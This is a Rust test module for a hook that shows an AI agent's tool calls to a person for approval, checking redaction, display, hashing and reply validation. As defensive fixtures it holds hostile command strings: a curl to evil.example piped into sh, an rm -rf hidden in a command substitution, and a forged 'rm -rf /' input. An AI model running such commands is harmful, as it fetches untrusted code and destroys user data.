            line("Grep", json!({"pattern": "TODO", "path": "/work/acme/src"})).text,
            "TODO in src"
        );
        assert_eq!(line("Glob", json!({"pattern": "**/*.rs"})).text, "**/*.rs");
        assert_eq!(
            line("WebSearch", json!({"query": "rust axum"})).text,
            "rust axum"
        );
        let fetch = line(
            "WebFetch",
            json!({"url": "https://user:pw@example.com/a/b?q=1#frag", "prompt": "summarise"}),
        );
        assert_eq!(fetch.text, "https://example.com/a/b");
        assert_eq!(
            fetch.unshown,
            [
                "prompt",
                "the address's sign-in part",
                "the address's query",
                "the address's fragment"
            ]
        );
        assert_eq!(
            line("WebFetch", json!({"url": "https://example.com/a#top"})).unshown,
            ["the address's fragment"]
        );
        let plain = line("WebFetch", json!({"url": "https://example.com/a"}));
        assert_eq!(
            plain,
            Display {
                text: "https://example.com/a".into(),
                ..Display::default()
            }
        );
        // Any other tool shows its whole input as indented JSON.
        let task = line("Task", json!({"description": "find it", "prompt": "long"}));
        assert_eq!(
            task,
            Display {
                text: "{\n  \"description\": \"find it\",\n  \"prompt\": \"long\"\n}".into(),
                ..Display::default()
            }
        );
        let started = line(
            "mcp__ccd_session__start_session",
            json!({"title": "Fix the login", "prompt": "Read src/login.rs.\nThen fix it.",
                "use_worktree": true}),
        );
        assert_eq!(
            started.text,
            "{\n  \"prompt\": \"Read src/login.rs.\\nThen fix it.\",\n  \"title\": \"Fix the login\",\n  \"use_worktree\": true\n}"
        );
        let mcp = line(
            "mcp__srv__do",
            json!({"id": 3, "api_key": "abc", "note": "token=zzz"}),
        );
        assert!(mcp.redacted >= 2, "each replaced secret is counted");
        assert!(mcp.text.contains(r#""id": 3"#));
        assert!(
            !mcp.text.contains("abc") && !mcp.text.contains("zzz"),
            "{}",
            mcp.text
        );
        // Nothing to show: only the tool, and that its input is not shown when it has one.
        assert_eq!(
            line("Bash", json!({})),
            Display {
                text: "Bash".into(),
                ..Display::default()
            }
        );
        assert_eq!(
            line("Bash", json!({"command": 123, "timeout": 5})),
            Display {
                text: "Bash".into(),
                unshown: vec![WHOLE_INPUT.into()],
                ..Display::default()
            }
        );
        assert_eq!(line("Custom", Value::Null).text, "Custom");
    }

    #[test]
    fn the_summary_says_in_one_line_what_the_call_does() {
        let cases = [
            (
                "Bash",
                json!({"command": "cargo publish", "description": "Publish the crate"}),
                "run a shell command: Publish the crate",
            ),
            ("Bash", json!({"command": "ls"}), "run a shell command"),
            (
                "Edit",
                json!({"file_path": "/work/acme/src/a.rs", "new_string": "secret"}),
                "edit a file: a.rs",
            ),
            (
                "WebFetch",
                json!({"url": "https://user:pw@example.com/a?q=1"}),
                "fetch a web page: https://example.com/a",
            ),
            (
                "mcp__ccd_session__start_session",
                json!({"title": "Fix the\n login", "prompt": "long"}),
                "use start session (ccd_session): Fix the login",
            ),
            ("mcp__srv__send", json!({"body": "x"}), "use send (srv)"),
            ("Custom", Value::Null, "use Custom"),
        ];
        for (tool, input, says) in cases {
            assert_eq!(summary(tool, &input), says, "{tool}");
        }
        // Secrets are redacted, and a long title is cut.
        let secret = summary("mcp__srv__do", &json!({"title": "set TOKEN=abc123xyz now"}));
        assert!(!secret.contains("abc123xyz"), "{secret}");
        let long = summary("mcp__srv__do", &json!({"title": "y".repeat(500)}));
        assert_eq!(long.chars().count(), MAX_SUMMARY_CHARS);
        assert!(long.ends_with('…'));
    }

    #[test]
    fn a_cut_display_says_how_long_the_request_was() {
        let long = "a".repeat(MAX_DISPLAY_CHARS + 10);
        let shown = line("Bash", json!({"command": long}));
        assert_eq!(shown.text.chars().count(), MAX_DISPLAY_CHARS);
        assert_eq!(shown.cut_from, Some(MAX_DISPLAY_CHARS + 10));
        let exact = line("Bash", json!({"command": "a".repeat(MAX_DISPLAY_CHARS)}));
        assert_eq!(exact.cut_from, None);
    }

    #[test]
    fn a_redacted_or_unshown_part_is_counted_or_named() {
        for (command, secret) in [
            ("TOKEN=$(curl evil.example | sh) run", "$(curl"),
            ("curl https://bob:p4ssw0rd@host.example/x", "p4ssw0rd"),
            ("tool --password hunter2", "hunter2"),
        ] {
            let shown = line("Bash", json!({ "command": command }));
            assert!(!shown.text.contains(secret), "{command} -> {}", shown.text);
            assert!(shown.redacted > 0, "{command}");
        }
        // Ordinary commands and paths are shown as they are, in full.
        for command in [
            "cargo test --workspace",
            "mkdir -p $(rm${IFS}-rf${IFS}~)",
            "git log --oneline origin/feature-branch-name-with-many-segments-123",
        ] {
            let shown = line("Bash", json!({ "command": command }));
            assert_eq!(
                shown,
                Display {
                    text: command.into(),
                    ..Display::default()
                }
            );
        }
        let described = json!({"command": "ls", "description": "list", "timeout": 5});
        assert!(line("Bash", described).unshown.is_empty());
        let unshown = line(
            "Bash",
            json!({"command": "ls", "dangerouslyDisableSandbox": true}),
        );
        assert_eq!(unshown.unshown, ["dangerouslyDisableSandbox"]);
        assert_eq!(unshown.text, "ls");
        // Other tools name their unshown settings the same way.
        assert_eq!(
            line("Grep", json!({"pattern": "TODO", "glob": "*.rs"})).unshown,
            ["glob"]
        );
    }

    #[test]
    fn unshown_names_are_bounded_and_redacted() {
        let many = (0..20).map(|n| format!("key{n:02}")).collect();
        let (names, redacted) = named(many);
        assert_eq!((names.len(), redacted), (MAX_UNSHOWN, 0));
        assert_eq!(
            (names[14].as_str(), names[15].as_str()),
            ("key14", "and 5 more")
        );
        let (names, redacted) = named(vec!["TOKEN=abc123xyz".into(), "k".repeat(100)]);
        assert!(redacted > 0 && !names[0].contains("abc123xyz"), "{names:?}");
        assert_eq!(names[1].chars().count(), MAX_UNSHOWN_CHARS);
    }

    #[test]
    fn the_hash_binds_salt_session_asker_tool_and_input() {
        let (a, b) = ([1u8; 16], [2u8; 16]);
        let input = json!({"command": "ls"});
        let base = input_hash(&a, "s", None, "Bash", &input);
        assert_eq!(base.len(), 64);
        assert!(
            base.bytes()
                .all(|c| c.is_ascii_digit() || (b'a'..=b'f').contains(&c))
        );
        assert_eq!(base, input_hash(&a, "s", None, "Bash", &input));
        for other in [
            input_hash(&b, "s", None, "Bash", &input),
            input_hash(&a, "t", None, "Bash", &input),
            input_hash(&a, "s", Some("sub"), "Bash", &input),
            input_hash(&a, "s", None, "Edit", &input),
            input_hash(&a, "s", None, "Bash", &json!({"command": "ls -l"})),
        ] {
            assert_ne!(base, other);
        }
    }

    /// The decision a hook prints for `answer` to a prompt with this hook input.
    fn printed(payload: &Value, answer: &Answer) -> Option<Value> {
        let tool = payload["tool_name"].as_str().unwrap_or("Bash");
        let decision = decision_output(answer, &offer(tool, payload)?, payload)?;
        Some(decision["hookSpecificOutput"]["decision"].clone())
    }

    #[test]
    fn a_decision_is_made_from_the_hooks_own_copy_of_what_was_offered() {
        let rule = json!({"type": "addRules", "behavior": "allow", "destination": "localSettings",
            "rules": [{"toolName": "Bash", "ruleContent": "python3 -c \"print(1)\""}]});
        let prompt = json!({"tool_name": "Bash", "tool_input": {"command": "python3 -c \"print(1)\""},
            // A kind this hook cannot describe is not offered, so the rule is choice 0.
            "permission_suggestions": [{"type": "setMode", "mode": "bypassPermissions",
                "destination": "session"}, rule]});
        assert_eq!(
            printed(&prompt, &Answer::Allow),
            Some(json!({"behavior": "allow"}))
        );
        assert_eq!(
            printed(&prompt, &Answer::Deny(None)),
            Some(json!({"behavior": "deny",
                "message": "Denied from the AgentSCM Hub by its person."}))
        );
        assert_eq!(
            printed(&prompt, &Answer::Deny(Some("use uv run".into()))),
            Some(json!({"behavior": "deny",
                "message": "Denied from the AgentSCM Hub by its person, who says: use uv run"}))
        );
        // A choice returns the host's own suggestion, whole.
        assert_eq!(
            printed(&prompt, &Answer::AllowWith(0)),
            Some(json!({"behavior": "allow", "updatedPermissions": [rule]}))
        );
        // A choice that was not offered, and answers to a prompt that asks nothing, fit nothing.
        assert_eq!(printed(&prompt, &Answer::AllowWith(1)), None);
        assert_eq!(
            printed(&prompt, &Answer::Answers(vec![Picked::Text("x".into())])),
            None
        );
    }

    #[test]
    fn a_choice_says_exactly_what_it_saves_and_where() {
        let offered = |suggestion: Value| choice(&suggestion);
        assert_eq!(
            offered(json!({"type": "addRules", "behavior": "allow", "destination": "localSettings",
                "rules": [{"toolName": "Bash", "ruleContent": "npm test"}, {"toolName": "mcp__srv__do"}]})),
            Some((
                "Allow, and do not ask again for this",
                "the rule Bash(npm test), mcp__srv__do, in this checkout's local settings (.claude/settings.local.json)".to_owned()
            ))
        );
        assert_eq!(
            offered(
                json!({"type": "addDirectories", "directories": ["/work/acme"],
                "destination": "session"})
            ),
            Some((
                "Allow, and allow access to the folder",
                "access to /work/acme, for this session only".to_owned()
            ))
        );
        assert_eq!(
            offered(json!({"type": "setMode", "mode": "acceptEdits", "destination": "session"})),
            Some((
                "Allow, and accept edits without asking",
                "accept edits mode, for this session only".to_owned()
            ))
        );
        // Not offered: a rule that does not allow, a mode or a place this hook does not know,
        // and a suggestion with nothing in it.
        for unknown in [
            json!({"type": "addRules", "behavior": "deny", "destination": "session",
                "rules": [{"toolName": "Bash"}]}),
            json!({"type": "addRules", "behavior": "allow", "destination": "session", "rules": []}),
            json!({"type": "setMode", "mode": "bypassPermissions", "destination": "session"}),
            json!({"type": "setMode", "mode": "acceptEdits", "destination": "cloud"}),
            json!({"type": "removeRules", "destination": "session"}),
            json!("addRules"),
        ] {
            assert_eq!(choice(&unknown), None, "{unknown}");
        }
        // Not offered either: a rule the person could not read in full, because it is longer
        // than the label, holds a secret that would be redacted, or runs over several lines.
        for content in [
            "x".repeat(MAX_OFFER_CHARS),
            "deploy TOKEN=abc123xyz".to_owned(),
            "echo a\necho b".to_owned(),
        ] {
            let rule = json!({"type": "addRules", "behavior": "allow", "destination": "session",
                "rules": [{"toolName": "Bash", "ruleContent": content}]});
            assert_eq!(choice(&rule), None, "{rule}");
        }
    }

    #[test]
    fn a_question_is_answered_with_the_hosts_own_questions_and_labels() {
        let questions = json!([
            {"question": "Which color?", "header": "Color", "multiSelect": false,
                "options": [{"label": "Red", "description": "Pick red"}, {"label": "Blue"}]},
            {"question": "Which sizes?", "header": "Size", "multiSelect": true,
                "options": [{"label": "S"}, {"label": "M"}, {"label": "L"}]},
        ]);
        let prompt = json!({"tool_name": "AskUserQuestion",
            "tool_input": {"questions": questions, "metadata": {"source": "x"}}});
        let answers = Answer::Answers(vec![
            Picked::Text("Green,\ntyped by hand".into()),
            Picked::Options(vec![0, 2]),
        ]);
        assert_eq!(
            printed(&prompt, &answers),
            Some(
                json!({"behavior": "allow", "updatedInput": {"questions": questions,
                "metadata": {"source": "x"},
                "answers": {"Which color?": "Green,\ntyped by hand", "Which sizes?": "S, L"}}})
            )
        );
        // A deny works as for a tool; an allow without answers, too few answers, two options
        // for a question that takes one and an option that does not exist fit nothing.
        assert!(printed(&prompt, &Answer::Deny(None)).is_some());
        let one = |options: Vec<usize>| {
            Answer::Answers(vec![Picked::Options(options), Picked::Options(vec![1])])
        };
        assert!(printed(&prompt, &one(vec![1])).is_some());
        for wrong in [
            Answer::Allow,
            Answer::AllowWith(0),
            Answer::Answers(vec![Picked::Options(vec![0])]),
            one(vec![0, 1]),
            one(vec![2]),
        ] {
            assert_eq!(printed(&prompt, &wrong), None, "{wrong:?}");
        }
        // Questions in another shape are not offered at all.
        for odd in [
            json!({}),
            json!({"questions": []}),
            json!({"questions": [{"question": "Q?", "options": []}]}),
            json!({"questions": [{"question": " ", "options": [{"label": "A"}]}]}),
            json!({"questions": [{"question": "Q?", "options": [{"label": ""}]}]}),
            json!({"questions": [{"question": "Q?", "options": [{"label": "A"}]},
                {"question": "Q?", "options": [{"label": "B"}]}]}),
        ] {
            let prompt = json!({"tool_name": "AskUserQuestion", "tool_input": odd});
            assert_eq!(offer("AskUserQuestion", &prompt), None, "{odd}");
        }
        // What the Hub is told: labels for the page, one line each, with secrets redacted.
        let mut body = json!({});
        let mut secret = prompt.clone();
        secret["tool_input"]["questions"][0]["options"][1]["label"] =
            json!("use TOKEN=abc123xyz\nnow");
        offer_fields(&offer("AskUserQuestion", &secret).unwrap(), &mut body);
        assert_eq!(body["questions"][0]["question"], "Which color?");
        assert_eq!(body["questions"][1]["multiple"], true);
        let label = body["questions"][0]["options"][1]["label"]
            .as_str()
            .unwrap();
        assert!(
            !label.contains("abc123xyz") && !label.contains('\n'),
            "{label}"
        );
        assert!(body.get("choices").is_none());
    }

    #[test]
    fn an_answer_is_read_only_in_the_shapes_this_hook_knows() {
        let reply = |more: Value| {
            let mut reply = json!({"request_id": "00ff", "input_hash": "h", "state": "answered"});
            for (key, value) in more.as_object().unwrap() {
                reply[key] = value.clone();
            }
            answer_in(&reply)
        };
        assert_eq!(reply(json!({"decision": "allow"})), Some(Answer::Allow));
        assert_eq!(
            reply(json!({"decision": "allow", "choice": 1, "reason": null})),
            Some(Answer::AllowWith(1))
        );
        assert_eq!(
            reply(json!({"decision": "deny", "reason": " not\u{1b} today\n"})),
            Some(Answer::Deny(Some("not today".into())))
        );
        assert_eq!(
            reply(json!({"decision": "allow",
                "answers": [{"options": [0, 2]}, {"text": "typed"}]})),
            Some(Answer::Answers(vec![
                Picked::Options(vec![0, 2]),
                Picked::Text("typed".into())
            ]))
        );
        for wrong in [
            json!({"decision": "allow", "reason": "because"}),
            json!({"decision": "deny", "choice": 0}),
            json!({"decision": "deny", "reason": 7}),
            json!({"decision": "deny", "reason": " \n"}),
            json!({"decision": "deny", "reason": "x".repeat(MAX_TYPED_CHARS + 1)}),
            json!({"decision": "allow", "choice": -1}),
            json!({"decision": "allow", "choice": "0"}),
            json!({"decision": "allow", "choice": 0, "answers": []}),
            json!({"decision": "allow", "answers": [{"options": []}]}),
            json!({"decision": "allow", "answers": [{"options": [0], "text": "both"}]}),
            json!({"decision": "allow", "answers": [{"label": "Red"}]}),
            json!({"decision": "allow", "answers": {"0": "Red"}}),
        ] {
            assert_eq!(reply(wrong.clone()), None, "{wrong}");
        }
    }

    #[test]
    fn a_decision_is_accepted_only_for_this_requests_id_and_hash() {
        let (id, hash) = ("0a1b2c", "h".repeat(64));
        let reply = |status, state: &str, decision: Value| {
            Some((
                status,
                json!({"request_id": id, "input_hash": hash, "state": state, "decision": decision}),
            ))
        };
        assert_eq!(
            classify(reply(200, "answered", json!("allow")), id, &hash),
            Step::Decide(Answer::Allow)
        );
        assert_eq!(
            classify(reply(200, "answered", json!("deny")), id, &hash),
            Step::Decide(Answer::Deny(None))
        );
        assert_eq!(
            classify(reply(200, "pending", Value::Null), id, &hash),
            Step::Wait { unconfirmed: false }
        );
        assert_eq!(
            classify(reply(200, "unconfirmed", Value::Null), id, &hash),
            Step::Wait { unconfirmed: true }
        );
        for stop in [
            reply(200, "ended", Value::Null),
            reply(200, "answered", json!("maybe")),
            reply(200, "answered", json!("ALLOW")),
            reply(200, "answered", Value::Null),
            reply(200, "pending", json!("allow")),
            reply(200, "answered", json!(true)),
            reply(404, "answered", json!("allow")),
            reply(401, "answered", json!("allow")),
            reply(409, "answered", json!("allow")),
            reply(500, "answered", json!("allow")),
            Some((200, json!("allow"))),
            Some((200, Value::Null)),
            Some((200, json!({"state": "answered", "decision": "allow"}))),
            Some((
                200,
                json!({"request_id": "other", "input_hash": hash, "state": "answered", "decision": "allow"}),
            )),
            Some((
                200,
                json!({"request_id": id, "input_hash": "x", "state": "answered", "decision": "allow"}),
            )),
            Some((
                200,
                json!({"request_id": id, "input_hash": hash, "state": "answered",
                       "decision": "allow", "updatedInput": {"command": "rm -rf /"}}),
            )),
        ] {
            assert_eq!(classify(stop.clone(), id, &hash), Step::Stop, "{stop:?}");
        }
        // Transient trouble is retried.
        assert_eq!(classify(None, id, &hash), Step::Retry);
        assert_eq!(
            classify(reply(502, "pending", Value::Null), id, &hash),
            Step::Retry
        );
        assert_eq!(
            classify(reply(429, "pending", Value::Null), id, &hash),
            Step::Retry
        );
        assert_eq!(
            classify(reply(503, "pending", Value::Null), id, &hash),
            Step::Retry
        );
    }

    #[test]
    fn a_registration_is_accepted_only_when_it_echoes_the_hash() {
        let hash = "a".repeat(64);
        let ok = |state: &str| {
            Some((
                200,
                json!({"request_id": "00ff", "input_hash": hash, "state": state}),
            ))
        };
        assert_eq!(
            registered(ok("pending"), &hash),
            Some(("00ff".into(), false))
        );
        assert_eq!(
            registered(ok("unconfirmed"), &hash),
            Some(("00ff".into(), true))
        );
        assert_eq!(registered(ok("answered"), &hash), None);
        assert_eq!(registered(None, &hash), None);
        assert_eq!(registered(ok("pending"), &"b".repeat(64)), None);
        assert_eq!(
            registered(Some((404, json!({"state": "pending"}))), &hash),
            None
        );
        let id_bad = Some((
            200,
            json!({"request_id": "not hex!", "input_hash": hash, "state": "pending"}),
        ));
        assert_eq!(registered(id_bad, &hash), None);
        let extra = Some((
            200,
            json!({"request_id": "00ff", "input_hash": hash, "state": "pending", "x": 1}),
        ));
        assert_eq!(registered(extra, &hash), None);
    }
}
